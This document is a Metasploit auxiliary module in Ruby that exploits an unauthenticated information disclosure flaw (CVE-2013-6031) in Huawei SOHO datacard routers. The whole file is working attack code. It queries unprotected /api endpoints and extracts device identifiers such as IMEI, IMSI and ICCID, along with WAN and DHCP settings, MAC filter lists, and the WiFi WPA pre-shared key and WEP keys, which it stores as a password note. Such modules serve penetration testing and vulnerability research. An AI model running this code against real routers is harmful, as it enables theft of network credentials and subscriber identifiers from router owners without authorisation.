##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'base64'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  BASIC_INFO = {
    'Device Name'      => /<DeviceName>(.*)<\/DeviceName>/i,
    'Serial Number'    => /<SerialNumber>(.*)<\/SerialNumber>/i,
    'IMEI'             => /<Imei>(.*)<\/Imei>/i,
    'IMSI'             => /<Imsi>(.*)<\/Imsi>/i,
    'ICCID'            => /<Iccid>(.*)<\/Iccid>/i,
    'Hardware Version' => /<HardwareVersion>(.*)<\/HardwareVersion>/i,
    'Software Version' => /<SoftwareVersion>(.*)<\/SoftwareVersion>/i,
    'WebUI Version'    => /<WebUIVersion>(.*)<\/WebUIVersion>/i,
    'Mac Address1'     => /<MacAddress1>(.*)<\/MacAddress1>/i,
    'Mac Address2'     => /<MacAddress2>(.*)<\/MacAddress2>/i,
    'Product Family'   => /<ProductFamily>(.*)<\/ProductFamily>/i,
    'Classification'   => /<Classify>(.*)<\/Classify>/i
  }

  WAN_INFO = {
    'Wan IP Address' => /<WanIPAddress>(.*)<\/WanIPAddress>/i,
    'Primary Dns'    => /<PrimaryDns>(.*)<\/PrimaryDns>/i,
    'Secondary Dns'  => /<SecondaryDns>(.*)<\/SecondaryDns>/i
  }

  DHCP_INFO ={
    'LAN IP Address'      => /<DhcpIPAddress>(.*)<\/DhcpIPAddress>/i,
    'DHCP StartIPAddress' => /<DhcpStartIPAddress>(.*)<\/DhcpStartIPAddress>/i,
    'DHCP EndIPAddress'   => /<DhcpEndIPAddress>(.*)<\/DhcpEndIPAddress>/i,
    'DHCP Lease Time'     => /<DhcpLeaseTime>(.*)<\/DhcpLeaseTime>/i
  }

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Huawei Datacard Information Disclosure Vulnerability",
      'Description'    => %q{
        This module exploits an un-authenticated information disclosure vulnerability in Huawei
        SOHO routers. The module will gather information by accessing the /api pages where
        authentication is not required, allowing configuration changes as well as information
        disclosure including any stored SMS.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Jimson K James.',
          '<tomsmaily[at]aczire.com>', # Msf module
        ],
      'References'     =>
        [
          ['CWE', '425'],
          ['CVE', '2013-6031'],
          ['US-CERT-VU', '341526'],
          ['URL', 'http://www.huaweidevice.co.in/Support/Downloads/'],
        ],
      'DisclosureDate' => "Nov 11 2013" ))

    register_options(
      [
        Opt::RHOST('mobilewifi.home')
      ], self.class)

  end

  #Gather basic router information
  def run
    get_router_info
    print_line('')
    get_router_mac_filter_info
    print_line('')
    get_router_wan_info
    print_line('')
    get_router_dhcp_info
    print_line('')
    get_wifi_info
    print_line('')
  end

  def get_wifi_info

    print_status('Now trying to get WiFi Key details...')
    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => '/api/wlan/security-settings',
      })

    unless is_target?(res)
      return
    end

    print_status('---===[ WiFi Key Details ]===---')

    wifissid = get_router_ssid
    if wifissid
      print_status("WiFi SSID: #{wifissid}")
    end

    # Grabbing the wifiwpapsk
    if res.body.match(/<WifiWpapsk>(.*)<\/WifiWpapsk>/i)
      wifiwpapsk = $1
      print_status("Wifi WPA pre-shared key: #{wifiwpapsk}")
    end

    # Grabbing the WifiAuthmode
    if res.body.match(/<WifiAuthmode>(.*)<\/WifiAuthmode>/i)
      wifiauthmode = $1
      print_status("Wifi Auth mode: #{wifiauthmode}")
    end

    # Grabbing the WifiBasicencryptionmodes
    if res.body.match(/<WifiBasicencryptionmodes>(.*)<\/WifiBasicencryptionmodes>/i)
      wifibasicencryptionmodes = $1
      print_status("Wifi Basic encryption modes: #{wifibasicencryptionmodes}")
    end

    # Grabbing the WifiWpaencryptionmodes
    if res.body.match(/<WifiWpaencryptionmodes>(.*)<\/WifiWpaencryptionmodes>/i)
      wifiwpaencryptionmodes = $1
      print_status("Wifi WPA Encryption Modes: #{wifiwpaencryptionmodes}")
    end

    # Grabbing the WifiWepKey1
    if res.body.match(/<WifiWepKey1>(.*)<\/WifiWepKey1>/i)
      wifiwepkey1 = $1
      print_status("Wifi WEP Key1: #{wifiwepkey1}")
    end

    # Grabbing the WifiWepKey2
    if res.body.match(/<WifiWepKey2>(.*)<\/WifiWepKey2>/i)
      wifiwepkey2 = $1
      print_status("Wifi WEP Key2: #{wifiwepkey2}")
    end

    # Grabbing the WifiWepKey3
    if res.body.match(/<WifiWepKey3>(.*)<\/WifiWepKey3>/i)
      wifiwepkey3 = $1
      print_status("Wifi WEP Key3: #{wifiwepkey3}")
    end

    # Grabbing the WifiWepKey4
    if res.body.match(/<WifiWepKey4>(.*)<\/WifiWepKey4>/i)
      wifiwepkey4 = $1
      print_status("Wifi WEP Key4: #{wifiwepkey4}")
    end

    # Grabbing the WifiWepKeyIndex
    if res.body.match(/<WifiWepKeyIndex>(.*)<\/WifiWepKeyIndex>/i)
      wifiwepkeyindex = $1
      print_status("Wifi WEP Key Index: #{wifiwepkeyindex}")
    end

    credentials = {
      'Access Point'   => rhost,
      'SSID'           => wifissid,
      'WPA Key'        => wifiwpapsk,
      '802.11 Auth'    => wifiauthmode,
      'EncryptionMode' => wifiwpaencryptionmodes,
      'WEP Key'        => wifiwepkey1
    }

    report_note(
      :host => rhost,
      :type => 'password',
      :data => credentials
    )
  end

  def get_router_info

    print_status("Attempting to connect to #{rhost} to gather basic device information...")
    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => '/api/device/information',
      })

    unless is_target?(res)
      return
    end

    resp_body = res.body.to_s

    print_status("Basic Information")

    BASIC_INFO.each do |k,v|
      if resp_body.match(v)
        info = $1
        print_status("#{k}: #{info}")
      end
    end
  end

  def get_router_ssid
    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => '/api/wlan/basic-settings',
      })

    #check whether we got any response from server and proceed.
    unless res
      print_error('Failed to get any response from server!!!')
      return
    end

    #Is it a HTTP OK
    unless res.code == 200
      print_error('Did not get HTTP 200, URL was not found. Exiting!')
      return
    end

    #Check to verify server reported is a Huawei router
    unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
      print_error('Target doesn\'t seem to be a Huawei router. Exiting!')
      return
    end

    # Grabbing the Wifi SSID
    if res.body.match(/<WifiSsid>(.*)<\/WifiSsid>/i)
      return $1
    end
  end

  def get_router_mac_filter_info
    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => '/api/wlan/mac-filter',
      })

    unless is_target?(res)
      return
    end

    print_status('MAC Filter Information')

    resp_body = res.body.to_s

    if resp_body.match(/<WifiMacFilterStatus>(.*)<\/WifiMacFilterStatus>/i)
      wifi_mac_filter_status = $1
      print_status("Wifi MAC Filter Status: #{(wifi_mac_filter_status == '1') ? 'ENABLED' : 'DISABLED'}" )
    end

    (0..9).each do |i|
      if resp_body.match(/<WifiMacFilterMac#{i}>(.*)<\/WifiMacFilterMac#{i}>/i)
        wifi_mac_filter = $1
        unless wifi_mac_filter.empty?
          print_status("Mac: #{wifi_mac_filter}")
        end
      end
    end
  end

  def get_router_wan_info
    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => '/api/monitoring/status',
      })

    unless is_target?(res)
      return
    end

    resp_body = res.body.to_s

    print_status('WAN Details')

    WAN_INFO.each do |k,v|
      if resp_body.match(v)
        info = $1
        print_status("#{k}: #{info}")
      end
    end
  end

  def get_router_dhcp_info

    res = send_request_raw(
      {
        'method'  => 'GET',
        'uri'     => '/api/dhcp/settings',
      })

    unless is_target?(res)
      return
    end

    resp_body = res.body.to_s

    print_status('DHCP Details')

    # Grabbing the DhcpStatus
    if resp_body.match(/<DhcpStatus>(.*)<\/DhcpStatus>/i)
      dhcp_status = $1
      print_status("DHCP: #{(dhcp_status == '1') ? 'ENABLED' : 'DISABLED'}")
    end

    unless dhcp_status && dhcp_status == '1'
      return
    end

    DHCP_INFO.each do |k,v|
      if resp_body.match(v)
        info = $1
        print_status("#{k}: #{info}")
      end
    end
  end

  def is_target?(res)
    #check whether we got any response from server and proceed.
    unless res
      print_error('Failed to get any response from server.')
      return false
    end

    #Is it a HTTP OK
    unless res.code == 200
      print_error('Did not get HTTP 200, URL was not found.')
      return false
    end

    #Check to verify server reported is a Huawei router
    unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
      print_error('Target doesn\'t seem to be a Huawei router')
      return false
    end

    true
  end
end
